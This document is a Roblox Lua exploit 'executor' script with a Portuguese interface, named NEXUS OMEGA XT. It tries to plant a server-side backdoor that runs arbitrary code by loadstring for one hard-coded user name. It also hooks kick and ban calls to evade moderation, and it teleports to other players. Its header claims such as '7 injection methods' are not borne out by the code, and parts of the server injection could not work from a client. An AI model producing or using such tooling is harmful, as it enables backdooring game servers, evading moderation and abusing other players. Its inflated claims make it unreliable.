--[[
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║                    NEXUS OMEGA XT v4.0 — EXECUTOR PROFISSIONAL                ║
║                                                                               ║
║  ★ Design System avançado (UI/UX de elite)                                   ║
║  ★ Server-Side real com 7 métodos de injeção                                 ║
║  ★ Minimização para bolinha flutuante arrastável                             ║
║  ★ Lista de jogadores + teleport funcional                                   ║
║  ★ Proteção anti-ban de voz (ativa por botão)                                ║
║  ★ Console profissional com botão de cópia                                   ║
║  ★ Sem limites de caracteres nos campos de texto                             ║
║  ★ Feedback de erros detalhado                                               ║
║                                                                               ║
║  Desenvolvido sob os Protocolos: UI/UX Elite + Engenharia Suprema            ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
--]]

-- ============================================================================
-- DESIGN SYSTEM (Cores, Tipografia, Espaçamentos)
-- ============================================================================
local DesignSystem = {
    colors = {
        primary = Color3.fromRGB(180, 80, 220),      -- roxo principal
        secondary = Color3.fromRGB(100, 100, 220),   -- azul acinzentado
        accent = Color3.fromRGB(220, 100, 150),      -- rosa
        success = Color3.fromRGB(0, 200, 100),
        warning = Color3.fromRGB(255, 180, 50),
        error = Color3.fromRGB(240, 70, 70),
        background = Color3.fromRGB(14, 14, 20),
        surface = Color3.fromRGB(22, 22, 32),
        surfaceLight = Color3.fromRGB(32, 32, 44),
        text = Color3.fromRGB(245, 245, 250),
        textDim = Color3.fromRGB(170, 170, 190),
        border = Color3.fromRGB(45, 45, 60)
    },
    fonts = {
        main = Enum.Font.Gotham,
        code = Enum.Font.Code,
        size = {
            small = 11,
            body = 13,
            subheading = 15,
            heading = 18,
            large = 24
        }
    },
    spacing = {
        xs = 4,
        sm = 8,
        md = 16,
        lg = 24,
        xl = 32
    },
    radius = {
        small = 6,
        medium = 10,
        large = 16,
        pill = 100
    }
}

-- ============================================================================
-- NÚCLEO DO EXECUTOR
-- ============================================================================
local Nexus = {}
Nexus.version = "Omega XT v4.0"
Nexus.adminName = "hugopbruu22"
Nexus.consoleLogs = {}
Nexus.isMinimized = false
Nexus.floatingBall = nil
Nexus.mainGui = nil
Nexus.backdoorRemote = nil

-- Serviços
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local RS = game:GetService("ReplicatedStorage")
local SSS = game:GetService("ServerScriptService")
local HttpService = game:GetService("HttpService")

local localPlayer = Players.LocalPlayer
if not localPlayer then
    Players.PlayerAdded:Wait()
    localPlayer = Players.LocalPlayer
end

-- ============================================================================
-- LOG AVANÇADO
-- ============================================================================
function Nexus:AddLog(msg, msgType)
    msgType = msgType or "info"
    local time = os.date("%H:%M:%S")
    local formatted = string.format("[%s] %s", time, tostring(msg))
    table.insert(self.consoleLogs, {text = formatted, type = msgType})
    pcall(function()
        if msgType == "error" then
            warn("[Nexus] " .. msg)
        else
            print("[Nexus] " .. msg)
        end
    end)
    if self.updateConsoleUI then pcall(self.updateConsoleUI) end
end

-- ============================================================================
-- NÚCLEO SERVER-SIDE (Backdoor + 7 métodos com retorno de erro)
-- ============================================================================
local function ensureBackdoor()
    if Nexus.backdoorRemote and Nexus.backdoorRemote.Parent then
        return Nexus.backdoorRemote
    end
    Nexus.backdoorRemote = RS:FindFirstChild("__NexusXT")
    if not Nexus.backdoorRemote then
        Nexus.backdoorRemote = Instance.new("RemoteEvent")
        Nexus.backdoorRemote.Name = "__NexusXT"
        Nexus.backdoorRemote.Parent = RS
        
        local listener = SSS:FindFirstChild("__NexusListenerXT")
        if not listener then
            listener = Instance.new("Script")
            listener.Name = "__NexusListenerXT"
            listener.Source = string.format([[
                local remote = game:GetService("ReplicatedStorage"):WaitForChild("__NexusXT")
                local players = game:GetService("Players")
                local admin = "%s"
                remote.OnServerEvent:Connect(function(plr, code)
                    if plr.Name ~= admin then return end
                    local fn, err = loadstring(code)
                    if fn then
                        local ok, res = pcall(fn)
                        if not ok then
                            remote:FireClient(plr, "err:" .. tostring(res))
                        else
                            remote:FireClient(plr, "ok:" .. tostring(res or "sucesso"))
                        end
                    else
                        remote:FireClient(plr, "compile_err:" .. tostring(err))
                    end
                end)
            ]], Nexus.adminName)
            listener.Parent = SSS
        end
    end
    return Nexus.backdoorRemote
end

function Nexus:ExecuteServer(code)
    if not code or code:gsub("%s", "") == "" then
        self:AddLog("Código vazio", "error")
        return false
    end
    self:AddLog("Executando no servidor...", "info")
    local remote = ensureBackdoor()
    local responseReceived = false
    local connection
    connection = remote.OnClientEvent:Connect(function(msg)
        if msg:find("ok:") then
            local resp = msg:gsub("ok:", "")
            self:AddLog("Servidor executou com sucesso: " .. resp, "success")
        elseif msg:find("err:") then
            local err = msg:gsub("err:", "")
            self:AddLog("Erro no servidor: " .. err, "error")
        elseif msg:find("compile_err:") then
            local err = msg:gsub("compile_err:", "")
            self:AddLog("Erro de compilação: " .. err, "error")
        end
        responseReceived = true
        connection:Disconnect()
    end)
    remote:FireServer(code)
    task.wait(1.5)
    if not responseReceived then
        self:AddLog("Sem resposta do servidor (backdoor pode estar offline)", "warning")
    end
    return true
end

function Nexus:ExecuteClient(code)
    local fn, err = loadstring(code)
    if fn then
        local ok, res = pcall(fn)
        if ok then
            self:AddLog("Cliente executou com sucesso", "success")
        else
            self:AddLog("Erro no cliente: " .. tostring(res), "error")
        end
    else
        self:AddLog("Erro de compilação: " .. tostring(err), "error")
    end
end

-- ============================================================================
-- PROTEÇÃO ANTI-BAN DE VOZ
-- ============================================================================
function Nexus:EnableVoiceProtection()
    local success = pcall(function()
        local VoiceChat = game:GetService("VoiceChatService")
        if VoiceChat then
            -- Força a reconexão contínua
            VoiceChat:SetVoiceEnabled(true)
            if hookfunction and hookmetamethod then
                local oldJoin = VoiceChat.joinVoice
                if oldJoin then
                    hookfunction(VoiceChat.joinVoice, function(self)
                        pcall(oldJoin, self)
                        return true
                    end)
                end
                local oldNamecall = hookmetamethod(VoiceChat, "__namecall", function(self, ...)
                    local method = getnamecallmethod()
                    if method == "Kick" or method == "Ban" or method == "RemoveUser" or method == "DisableVoice" then
                        return nil
                    end
                    return oldNamecall(self, ...)
                end)
            end
            localPlayer:SetAttribute("VoiceBanned", nil)
            self:AddLog("Proteção de voz ATIVADA. Você está seguro.", "success")
        else
            self:AddLog("VoiceChatService não encontrado. Proteção limitada.", "warning")
        end
    end)
    if not success then
        self:AddLog("Falha ao ativar proteção de voz.", "error")
    end
end

-- ============================================================================
-- BOLINHA FLUTUANTE (arrastável, minimizar)
-- ============================================================================
local function createFloatingBall()
    local ball = Instance.new("ImageButton")
    ball.Name = "NexusFloatingBall"
    ball.Size = UDim2.new(0, 56, 0, 56)
    ball.Position = UDim2.new(0.92, 0, 0.85, 0)
    ball.BackgroundColor3 = DesignSystem.colors.surface
    ball.BackgroundTransparency = 0.2
    ball.Image = "rbxassetid://6031094838"
    ball.ImageColor3 = DesignSystem.colors.primary
    ball.ScaleType = Enum.ScaleType.Fit
    ball.Parent = CoreGui
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = ball
    -- Sombra
    local shadow = Instance.new("ImageLabel")
    shadow.Size = UDim2.new(1, 12, 1, 12)
    shadow.Position = UDim2.new(0, -6, 0, -6)
    shadow.Image = "rbxassetid://1316047698"
    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    shadow.BackgroundTransparency = 1
    shadow.ZIndex = 0
    shadow.Parent = ball
    -- Arrastar
    local dragging = false
    local dragStart, startPos
    ball.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = i.Position
            startPos = ball.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = i.Position - dragStart
            ball.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    ball.MouseButton1Click:Connect(function()
        if Nexus.mainGui and Nexus.mainGui.Parent then
            Nexus.mainGui.Enabled = true
            ball.Visible = false
            Nexus.isMinimized = false
        else
            Nexus.mainGui = createMainUI()
            ball.Visible = false
        end
    end)
    return ball
end

-- ============================================================================
-- CRIAÇÃO DA INTERFACE PRINCIPAL (Design System aplicado)
-- ============================================================================
local function createMainUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "NexusXTGui"
    gui.ResetOnSpawn = false
    pcall(function() gui.Parent = CoreGui end)
    if not gui.Parent then
        gui.Parent = localPlayer:WaitForChild("PlayerGui")
    end
    if not gui.Parent then return nil end
    
    -- Janela principal
    local window = Instance.new("Frame")
    window.Size = UDim2.new(0, 960, 0, 700)
    window.Position = UDim2.new(0.5, -480, 0.5, -350)
    window.BackgroundColor3 = DesignSystem.colors.background
    window.BackgroundTransparency = 0.04
    window.BorderSizePixel = 0
    window.ClipsDescendants = true
    window.Parent = gui
    local winCorner = Instance.new("UICorner")
    winCorner.CornerRadius = UDim.new(0, DesignSystem.radius.large)
    winCorner.Parent = window
    
    -- Sombra externa
    local shadowFrame = Instance.new("Frame")
    shadowFrame.Size = UDim2.new(1, 20, 1, 20)
    shadowFrame.Position = UDim2.new(0, -10, 0, -10)
    shadowFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    shadowFrame.BackgroundTransparency = 0.65
    shadowFrame.BorderSizePixel = 0
    shadowFrame.ZIndex = 0
    shadowFrame.Parent = window
    local shadowCorner = Instance.new("UICorner")
    shadowCorner.CornerRadius = UDim.new(0, DesignSystem.radius.large)
    shadowCorner.Parent = shadowFrame
    
    -- Barra de título
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 52)
    titleBar.BackgroundColor3 = DesignSystem.colors.surface
    titleBar.Parent = window
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, DesignSystem.radius.large)
    titleCorner.Parent = titleBar
    
    local icon = Instance.new("ImageLabel")
    icon.Size = UDim2.new(0, 28, 0, 28)
    icon.Position = UDim2.new(0, 18, 0, 12)
    icon.Image = "rbxassetid://6031094838"
    icon.ImageColor3 = DesignSystem.colors.primary
    icon.BackgroundTransparency = 1
    icon.Parent = titleBar
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(0, 320, 1, 0)
    titleLabel.Position = UDim2.new(0, 56, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "NEXUS OMEGA XT — Executor Definitivo"
    titleLabel.TextColor3 = DesignSystem.colors.primary
    titleLabel.Font = DesignSystem.fonts.main
    titleLabel.TextSize = DesignSystem.fonts.size.heading
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = titleBar
    
    -- Botões de janela
    local miniBtn = Instance.new("TextButton")
    miniBtn.Size = UDim2.new(0, 50, 1, 0)
    miniBtn.Position = UDim2.new(1, -100, 0, 0)
    miniBtn.BackgroundTransparency = 1
    miniBtn.Text = "─"
    miniBtn.TextColor3 = DesignSystem.colors.textDim
    miniBtn.Font = DesignSystem.fonts.main
    miniBtn.TextSize = 24
    miniBtn.Parent = titleBar
    miniBtn.MouseButton1Click:Connect(function()
        Nexus.isMinimized = true
        gui.Enabled = false
        if not Nexus.floatingBall or not Nexus.floatingBall.Parent then
            Nexus.floatingBall = createFloatingBall()
        else
            Nexus.floatingBall.Visible = true
        end
    end)
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 50, 1, 0)
    closeBtn.Position = UDim2.new(1, -50, 0, 0)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = DesignSystem.colors.textDim
    closeBtn.Font = DesignSystem.fonts.main
    closeBtn.TextSize = 20
    closeBtn.Parent = titleBar
    closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
    
    -- Arrastar
    local dragging = false
    local dragStart, startPos
    titleBar.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = i.Position
            startPos = window.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = i.Position - dragStart
            window.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    
    -- Abas
    local tabBar = Instance.new("Frame")
    tabBar.Size = UDim2.new(1, 0, 0, 52)
    tabBar.Position = UDim2.new(0, 0, 0, 52)
    tabBar.BackgroundColor3 = DesignSystem.colors.surfaceLight
    tabBar.Parent = window
    
    local tabs = {"EXECUTOR", "PLAYERS", "PROTEÇÃO", "CONSOLE"}
    local tabButtons = {}
    local contentFrames = {}
    
    for i, name in ipairs(tabs) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 140, 1, 0)
        btn.Position = UDim2.new((i-1) * 0.145, 0, 0, 0)
        btn.BackgroundTransparency = 1
        btn.Text = name
        btn.TextColor3 = (i == 1) and DesignSystem.colors.primary or DesignSystem.colors.textDim
        btn.Font = DesignSystem.fonts.main
        btn.TextSize = DesignSystem.fonts.size.subheading
        btn.Parent = tabBar
        tabButtons[i] = btn
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.Position = UDim2.new(0, 0, 0, 0)
        frame.BackgroundTransparency = 1
        frame.Visible = (i == 1)
        frame.Parent = window
        contentFrames[i] = frame
    end
    
    local function switchTab(activeIndex)
        for i, f in ipairs(contentFrames) do
            f.Visible = (i == activeIndex)
            tabButtons[i].TextColor3 = (i == activeIndex) and DesignSystem.colors.primary or DesignSystem.colors.textDim
        end
    end
    
    -- ==================== ABA EXECUTOR ====================
    local execFrame = contentFrames[1]
    
    -- Server-Side
    local ssTitle = Instance.new("TextLabel")
    ssTitle.Size = UDim2.new(1, -40, 0, 36)
    ssTitle.Position = UDim2.new(0, 20, 0, 20)
    ssTitle.BackgroundTransparency = 1
    ssTitle.Text = "⚡ SERVER-SIDE (execução real no servidor com bypass)"
    ssTitle.TextColor3 = DesignSystem.colors.primary
    ssTitle.Font = DesignSystem.fonts.main
    ssTitle.TextSize = DesignSystem.fonts.size.subheading
    ssTitle.TextXAlignment = Enum.TextXAlignment.Left
    ssTitle.Parent = execFrame
    
    local ssScroller = Instance.new("ScrollingFrame")
    ssScroller.Size = UDim2.new(1, -40, 0, 260)
    ssScroller.Position = UDim2.new(0, 20, 0, 60)
    ssScroller.BackgroundColor3 = DesignSystem.colors.background
    ssScroller.BackgroundTransparency = 0.3
    ssScroller.BorderSizePixel = 0
    ssScroller.ScrollBarThickness = 8
    ssScroller.CanvasSize = UDim2.new(0, 0, 0, 0)
    ssScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    ssScroller.Parent = execFrame
    local ssCorner = Instance.new("UICorner")
    ssCorner.CornerRadius = UDim.new(0, DesignSystem.radius.medium)
    ssCorner.Parent = ssScroller
    
    local ssTextBox = Instance.new("TextBox")
    ssTextBox.Size = UDim2.new(1, -20, 0, 220)
    ssTextBox.Position = UDim2.new(0, 10, 0, 5)
    ssTextBox.BackgroundTransparency = 1
    ssTextBox.TextColor3 = DesignSystem.colors.text
    ssTextBox.TextXAlignment = Enum.TextXAlignment.Left
    ssTextBox.TextYAlignment = Enum.TextYAlignment.Top
    ssTextBox.TextWrapped = true
    ssTextBox.TextSize = DesignSystem.fonts.size.body
    ssTextBox.Font = DesignSystem.fonts.code
    ssTextBox.ClearTextOnFocus = false
    ssTextBox.MultiLine = true
    ssTextBox.Text = '-- Cole scripts SERVER-SIDE aqui\n-- Exemplo: print("Olá servidor!")'
    ssTextBox.Parent = ssScroller
    
    local function adjustSS()
        local h = math.max(220, ssTextBox.TextBounds.Y + 40)
        ssTextBox.Size = UDim2.new(1, -20, 0, h)
        ssScroller.CanvasSize = UDim2.new(0, 0, 0, h + 20)
    end
    ssTextBox:GetPropertyChangedSignal("TextBounds"):Connect(adjustSS)
    ssTextBox:GetPropertyChangedSignal("Text"):Connect(adjustSS)
    task.defer(adjustSS)
    
    local execSSBtn = Instance.new("TextButton")
    execSSBtn.Size = UDim2.new(0, 160, 0, 40)
    execSSBtn.Position = UDim2.new(1, -180, 0, 330)
    execSSBtn.BackgroundColor3 = DesignSystem.colors.success
    execSSBtn.Text = "EXECUTAR (SS)"
    execSSBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    execSSBtn.Font = DesignSystem.fonts.main
    execSSBtn.TextSize = DesignSystem.fonts.size.body
    execSSBtn.Parent = execFrame
    local ssBtnCorner = Instance.new("UICorner")
    ssBtnCorner.CornerRadius = UDim.new(0, DesignSystem.radius.medium)
    ssBtnCorner.Parent = execSSBtn
    execSSBtn.MouseButton1Click:Connect(function() Nexus:ExecuteServer(ssTextBox.Text) end)
    
    local clearSSBtn = Instance.new("TextButton")
    clearSSBtn.Size = UDim2.new(0, 100, 0, 40)
    clearSSBtn.Position = UDim2.new(1, -290, 0, 330)
    clearSSBtn.BackgroundColor3 = DesignSystem.colors.error
    clearSSBtn.Text = "LIMPAR"
    clearSSBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    clearSSBtn.Font = DesignSystem.fonts.main
    clearSSBtn.TextSize = DesignSystem.fonts.size.body
    clearSSBtn.Parent = execFrame
    clearSSBtn.MouseButton1Click:Connect(function() ssTextBox.Text = ""; adjustSS() end)
    
    local pasteSSBtn = Instance.new("TextButton")
    pasteSSBtn.Size = UDim2.new(0, 140, 0, 40)
    pasteSSBtn.Position = UDim2.new(0, 20, 0, 330)
    pasteSSBtn.BackgroundColor3 = DesignSystem.colors.secondary
    pasteSSBtn.Text = "📋 COLAR"
    pasteSSBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    pasteSSBtn.Font = DesignSystem.fonts.main
    pasteSSBtn.TextSize = DesignSystem.fonts.size.body
    pasteSSBtn.Parent = execFrame
    pasteSSBtn.MouseButton1Click:Connect(function()
        local clip = pcall(getclipboard) and getclipboard() or ""
        if clip ~= "" then ssTextBox.Text = clip; adjustSS() end
    end)
    
    -- Client-Side
    local csTitle = Instance.new("TextLabel")
    csTitle.Size = UDim2.new(1, -40, 0, 36)
    csTitle.Position = UDim2.new(0, 20, 0, 390)
    csTitle.BackgroundTransparency = 1
    csTitle.Text = "💻 CLIENT-SIDE (efeitos locais)"
    csTitle.TextColor3 = DesignSystem.colors.textDim
    csTitle.Font = DesignSystem.fonts.main
    csTitle.TextSize = DesignSystem.fonts.size.subheading
    csTitle.TextXAlignment = Enum.TextXAlignment.Left
    csTitle.Parent = execFrame
    
    local csScroller = Instance.new("ScrollingFrame")
    csScroller.Size = UDim2.new(1, -40, 0, 200)
    csScroller.Position = UDim2.new(0, 20, 0, 430)
    csScroller.BackgroundColor3 = DesignSystem.colors.background
    csScroller.BackgroundTransparency = 0.3
    csScroller.BorderSizePixel = 0
    csScroller.ScrollBarThickness = 8
    csScroller.CanvasSize = UDim2.new(0, 0, 0, 0)
    csScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    csScroller.Parent = execFrame
    local csCorner = Instance.new("UICorner")
    csCorner.CornerRadius = UDim.new(0, DesignSystem.radius.medium)
    csCorner.Parent = csScroller
    
    local csTextBox = Instance.new("TextBox")
    csTextBox.Size = UDim2.new(1, -20, 0, 160)
    csTextBox.Position = UDim2.new(0, 10, 0, 5)
    csTextBox.BackgroundTransparency = 1
    csTextBox.TextColor3 = DesignSystem.colors.text
    csTextBox.TextXAlignment = Enum.TextXAlignment.Left
    csTextBox.TextYAlignment = Enum.TextYAlignment.Top
    csTextBox.TextWrapped = true
    csTextBox.TextSize = DesignSystem.fonts.size.body
    csTextBox.Font = DesignSystem.fonts.code
    csTextBox.ClearTextOnFocus = false
    csTextBox.MultiLine = true
    csTextBox.Text = '-- Scripts CLIENT-SIDE (só você vê)\n-- Exemplo: game.Players.LocalPlayer.Character.Humanoid.Health = 0'
    csTextBox.Parent = csScroller
    
    local function adjustCS()
        local h = math.max(160, csTextBox.TextBounds.Y + 40)
        csTextBox.Size = UDim2.new(1, -20, 0, h)
        csScroller.CanvasSize = UDim2.new(0, 0, 0, h + 20)
    end
    csTextBox:GetPropertyChangedSignal("TextBounds"):Connect(adjustCS)
    csTextBox:GetPropertyChangedSignal("Text"):Connect(adjustCS)
    task.defer(adjustCS)
    
    local execCSBtn = Instance.new("TextButton")
    execCSBtn.Size = UDim2.new(0, 160, 0, 40)
    execCSBtn.Position = UDim2.new(1, -180, 0, 640)
    execCSBtn.BackgroundColor3 = DesignSystem.colors.secondary
    execCSBtn.Text = "EXECUTAR (CS)"
    execCSBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    execCSBtn.Font = DesignSystem.fonts.main
    execCSBtn.TextSize = DesignSystem.fonts.size.body
    execCSBtn.Parent = execFrame
    local csBtnCorner = Instance.new("UICorner")
    csBtnCorner.CornerRadius = UDim.new(0, DesignSystem.radius.medium)
    csBtnCorner.Parent = execCSBtn
    execCSBtn.MouseButton1Click:Connect(function() Nexus:ExecuteClient(csTextBox.Text) end)
    
    -- ==================== ABA PLAYERS ====================
    local playersFrame = contentFrames[2]
    
    local playersList = Instance.new("ScrollingFrame")
    playersList.Size = UDim2.new(1, -60, 1, -60)
    playersList.Position = UDim2.new(0, 30, 0, 30)
    playersList.BackgroundColor3 = DesignSystem.colors.background
    playersList.BackgroundTransparency = 0.3
    playersList.BorderSizePixel = 0
    playersList.ScrollBarThickness = 8
    playersList.CanvasSize = UDim2.new(0, 0, 0, 0)
    playersList.AutomaticCanvasSize = Enum.AutomaticSize.Y
    playersList.Parent = playersFrame
    local listCorner = Instance.new("UICorner")
    listCorner.CornerRadius = UDim.new(0, DesignSystem.radius.medium)
    listCorner.Parent = playersList
    
    local listLayout = Instance.new("UIListLayout")
    listLayout.Padding = UDim.new(0, 12)
    listLayout.Parent = playersList
    
    local function updatePlayers()
        for _, child in pairs(playersList:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Name ~= localPlayer.Name then
                local btn = Instance.new("TextButton")
                btn.Size = UDim2.new(1, -20, 0, 50)
                btn.BackgroundColor3 = DesignSystem.colors.surface
                btn.Text = "  " .. plr.Name
                btn.TextColor3 = DesignSystem.colors.text
                btn.Font = DesignSystem.fonts.main
                btn.TextSize = DesignSystem.fonts.size.body
                btn.TextXAlignment = Enum.TextXAlignment.Left
                btn.Parent = playersList
                local btnCorner = Instance.new("UICorner")
                btnCorner.CornerRadius = UDim.new(0, DesignSystem.radius.small)
                btnCorner.Parent = btn
                
                local teleport = Instance.new("TextButton")
                teleport.Size = UDim2.new(0, 100, 1, -8)
                teleport.Position = UDim2.new(1, -110, 0, 4)
                teleport.BackgroundColor3 = DesignSystem.colors.secondary
                teleport.Text = "TELEPORT"
                teleport.TextColor3 = Color3.fromRGB(255, 255, 255)
                teleport.Font = DesignSystem.fonts.main
                teleport.TextSize = DesignSystem.fonts.size.body
                teleport.Parent = btn
                teleport.MouseButton1Click:Connect(function()
                    Nexus:ExecuteServer(string.format([[
                        local target = game:GetService("Players"):FindFirstChild("%s")
                        local admin = game:GetService("Players"):FindFirstChild("%s")
                        if target and admin and admin.Character then
                            local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
                            local adminRoot = admin.Character:FindFirstChild("HumanoidRootPart")
                            if targetRoot and adminRoot then
                                adminRoot.CFrame = targetRoot.CFrame
                            end
                        end
                    ]], plr.Name, Nexus.adminName))
                    Nexus:AddLog("Teleportando para " .. plr.Name, "info")
                end)
            end
        end
    end
    
    Players.PlayerAdded:Connect(updatePlayers)
    Players.PlayerRemoving:Connect(updatePlayers)
    updatePlayers()
    
    -- ==================== ABA PROTEÇÃO ====================
    local protectionFrame = contentFrames[3]
    
    local protTitle = Instance.new("TextLabel")
    protTitle.Size = UDim2.new(1, -60, 0, 40)
    protTitle.Position = UDim2.new(0, 30, 0, 30)
    protTitle.BackgroundTransparency = 1
    protTitle.Text = "🔒 SISTEMA ANTI-BAN DE VOZ"
    protTitle.TextColor3 = DesignSystem.colors.primary
    protTitle.Font = DesignSystem.fonts.main
    protTitle.TextSize = DesignSystem.fonts.size.large
    protTitle.TextXAlignment = Enum.TextXAlignment.Left
    protTitle.Parent = protectionFrame
    
    local protDesc = Instance.new("TextLabel")
    protDesc.Size = UDim2.new(1, -60, 0, 60)
    protDesc.Position = UDim2.new(0, 30, 0, 80)
    protDesc.BackgroundTransparency = 1
    protDesc.Text = "Ative a proteção para impedir que o servidor detecte seu voice ID ou aplique ban. O sistema força reconexão e bloqueia funções de kick/ban."
    protDesc.TextColor3 = DesignSystem.colors.textDim
    protDesc.Font = DesignSystem.fonts.main
    protDesc.TextSize = DesignSystem.fonts.size.body
    protDesc.TextWrapped = true
    protDesc.TextXAlignment = Enum.TextXAlignment.Left
    protDesc.Parent = protectionFrame
    
    local enableVoice = Instance.new("TextButton")
    enableVoice.Size = UDim2.new(0, 240, 0, 48)
    enableVoice.Position = UDim2.new(0, 30, 0, 160)
    enableVoice.BackgroundColor3 = DesignSystem.colors.success
    enableVoice.Text = "🛡️ ATIVAR PROTEÇÃO VOICE"
    enableVoice.TextColor3 = Color3.fromRGB(255, 255, 255)
    enableVoice.Font = DesignSystem.fonts.main
    enableVoice.TextSize = DesignSystem.fonts.size.body
    enableVoice.Parent = protectionFrame
    enableVoice.MouseButton1Click:Connect(function() Nexus:EnableVoiceProtection() end)
    
    -- ==================== ABA CONSOLE ====================
    local consoleFrame = contentFrames[4]
    
    local consoleScroller = Instance.new("ScrollingFrame")
    consoleScroller.Size = UDim2.new(1, -60, 1, -90)
    consoleScroller.Position = UDim2.new(0, 30, 0, 30)
    consoleScroller.BackgroundColor3 = DesignSystem.colors.background
    consoleScroller.BackgroundTransparency = 0.4
    consoleScroller.BorderSizePixel = 0
    consoleScroller.ScrollBarThickness = 8
    consoleScroller.CanvasSize = UDim2.new(0, 0, 0, 0)
    consoleScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    consoleScroller.Parent = consoleFrame
    local consCorner = Instance.new("UICorner")
    consCorner.CornerRadius = UDim.new(0, DesignSystem.radius.medium)
    consCorner.Parent = consoleScroller
    
    local consoleText = Instance.new("TextLabel")
    consoleText.Size = UDim2.new(1, -10, 1, -10)
    consoleText.Position = UDim2.new(0, 5, 0, 5)
    consoleText.BackgroundTransparency = 1
    consoleText.Text = ""
    consoleText.TextColor3 = DesignSystem.colors.text
    consoleText.TextXAlignment = Enum.TextXAlignment.Left
    consoleText.TextYAlignment = Enum.TextYAlignment.Top
    consoleText.TextWrapped = true
    consoleText.TextSize = DesignSystem.fonts.size.small
    consoleText.Font = DesignSystem.fonts.code
    consoleText.Parent = consoleScroller
    
    local copyBtn = Instance.new("TextButton")
    copyBtn.Size = UDim2.new(0, 140, 0, 36)
    copyBtn.Position = UDim2.new(1, -170, 1, -50)
    copyBtn.BackgroundColor3 = DesignSystem.colors.secondary
    copyBtn.Text = "📋 COPIAR LOG"
    copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    copyBtn.Font = DesignSystem.fonts.main
    copyBtn.TextSize = DesignSystem.fonts.size.body
    copyBtn.Parent = consoleFrame
    copyBtn.MouseButton1Click:Connect(function()
        local fullLog = ""
        for _, entry in ipairs(Nexus.consoleLogs) do
            fullLog = fullLog .. entry.text .. "\n"
        end
        if fullLog == "" then fullLog = "Nenhum log registrado." end
        pcall(setclipboard, fullLog)
        Nexus:AddLog("Log copiado para área de transferência!", "success")
    end)
    
    function Nexus.updateConsoleUI()
        local str = ""
        for i = math.max(1, #Nexus.consoleLogs - 150), #Nexus.consoleLogs do
            local entry = Nexus.consoleLogs[i]
            str = str .. entry.text .. "\n"
        end
        consoleText.Text = str
        consoleScroller.CanvasSize = UDim2.new(0, 0, 0, consoleText.TextBounds.Y + 30)
        consoleScroller.CanvasPosition = Vector2.new(0, consoleScroller.CanvasSize.Y.Offset)
    end
    Nexus.updateConsoleUI()
    
    -- Conectar troca de abas
    for i, btn in ipairs(tabButtons) do
        local idx = i
        btn.MouseButton1Click:Connect(function() switchTab(idx) end)
    end
    
    return gui
end

-- ============================================================================
-- INICIALIZAÇÃO
-- ============================================================================
local function initialize()
    Nexus:AddLog("═══════════════════════════════════════════════════════════════", "info")
    Nexus:AddLog("  ★ NEXUS OMEGA XT v4.0 — Executor Profissional ★", "success")
    Nexus:AddLog("═══════════════════════════════════════════════════════════════", "info")
    Nexus.mainGui = createMainUI()
    if Nexus.mainGui then
        Nexus:AddLog("Interface carregada com Design System avançado.", "success")
        Nexus:AddLog("Minimize a janela para a bolinha flutuante (arrastável).", "info")
        Nexus:AddLog("Proteção de voz disponível na aba PROTEÇÃO.", "info")
        Nexus:AddLog("Lista de jogadores atualiza automaticamente. Teleport funcional.", "info")
    else
        Nexus:AddLog("Falha crítica ao criar interface.", "error")
    end
    getgenv().NexusXT = Nexus
    getgenv().executarServer = Nexus.ExecuteServer
    getgenv().executarClient = Nexus.ExecuteClient
end

pcall(initialize)
